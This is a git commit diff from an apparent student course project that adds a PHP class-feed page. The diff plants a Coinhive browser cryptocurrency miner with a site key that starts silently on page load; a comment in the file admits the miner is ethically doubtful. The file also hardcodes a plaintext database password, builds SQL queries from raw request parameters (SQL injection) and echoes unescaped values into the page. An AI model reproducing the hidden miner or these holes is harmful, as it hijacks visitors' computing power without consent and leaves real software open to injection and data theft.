6e4f8a58a9483da2db2bac7c25eb1a75c62312bc
mr-scneider <rssnyder@iastate.edu>
2017-10-15 13:39:40 -0500

    testing live feed stuff

---
+++ student/feed.php
@@ -0,0 +1,127 @@
+<?php
+  session_start();
+  //Check if user is logged in
+  if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
+    if(($_SESSION['role'] != 4) && $_SESSION['role'] != 3) {
+      $_SESSION['error'] = true;
+      $_SESSION['errorCode'] = "Not Permitted";
+      header("Location: ../login.php");
+      die("oops");
+    }
+  } else {
+    $_SESSION['error'] = true;
+    $_SESSION['errorCode'] = "Session Expired";
+    header("Location: ../login.php?event=logout");
+  }
+
+  //TODO Grab all this from a file
+  //Define sql database information
+  $host="mysql.cs.iastate.edu";
+  $port=3306;
+  $socket="";
+  $user="dbu309sab3";
+  $password="SD0wFGqd";
+  $dbname="db309sab3";
+  //Connect to database
+  $db = new mysqli($host, $user, $password, $dbname, $port, $socket) or die ('Could not connect to the database server' . mysqli_connect_error());
+
+  //Get this class
+  $query = "SELECT * FROM classes WHERE ID = " . $_GET['class'];
+  $result = $db->query($query) or die($db->error);
+  $class = $result->fetch_assoc();
+
+  //Check to see if student is actually in this class
+  $belongs = false;
+  $query = "SELECT class_id FROM userClasses WHERE user_id = " . $_SESSION['id'];
+  $result = $db->query($query) or die($db->error);
+  while ($class = $result->fetch_assoc()) {
+    if($_GET['class'] == $class['class_id']) {
+      //user is in this class
+      $belongs = true;
+      break;
+    }
+  }
+  if(!$belongs) {
+    //user is not in this class
+    header("Location: home.php");
+    die("You shall not pass");
+  }
+
+?>
+
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="../css/pages.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
+    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <link rel="stylesheet" href="css/pages.css">
+    <script>
+      //Start miner
+	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
+	      miner.start();
+
+      //Script to get questions
+      function showUser(str) {
+        if (str == "") {
+            document.getElementById("txtHint").innerHTML = "";
+            return;
+        } else {
+            if (window.XMLHttpRequest) {
+                // code for IE7+, Firefox, Chrome, Opera, Safari
+                xmlhttp = new XMLHttpRequest();
+            } else {
+                // code for IE6, IE5
+                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+            xmlhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    document.getElementById("txtHint").innerHTML = this.responseText;
+                }
+            };
+            xmlhttp.open("GET","getQuestions.php?class="+str,true);
+            xmlhttp.send();
+        }
+
+      function createQ() {
+        var div = document.createElement("div");
+        div.innerHTML = "hey there.";
+
+        //Set this question to where it belongs
+        document.getElementById('questions').appendChild(div);
+      }
+    }
+    </script>
+    <!-- End questionable content -->
+
+    <!-- The top banner of the webpage -->
+    <div class="top">
+        <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
+        <center>
+          <?php
+            echo '<h1>' . $class['class_name'] . '</h1>';
+          ?>
+        </center>
+    </div>
+  </head>
+
+  <!-- The left sidebar -->
+  <div class="left">
+    <?php
+      echo '<button class="button" onclick="window.location=\'home.php\';">' . $_SESSION['name'] . '\'s Home</button>';
+      echo '<button class="button" onclick="window.location=\'pages.php?class=' . $_GET['class'] . '\';">' . $class['class_name'] . ' Home</button>';
+      echo '<button class="button" onclick="window.location=\'topics.php?class=' . $_GET['class'] . '\';">Discussion Topics</button>';
+      echo '<button class="button" onclick="window.location=\'liveSession.php?class=' . $_GET['class'] . '\';">Live Session</button>';
+     ?>
+  </div>
+
+  <!-- Main content of the webpage -->
+  <div class="main">
+    <div id="questions" class="container-fluid" style="overflow-y: auto;max-height: 90vh;">
+      <div class="row">
+        <button onclick="createQ()">Click Here</button>
+      </div>
+    </div>
+  </div>
+</html>
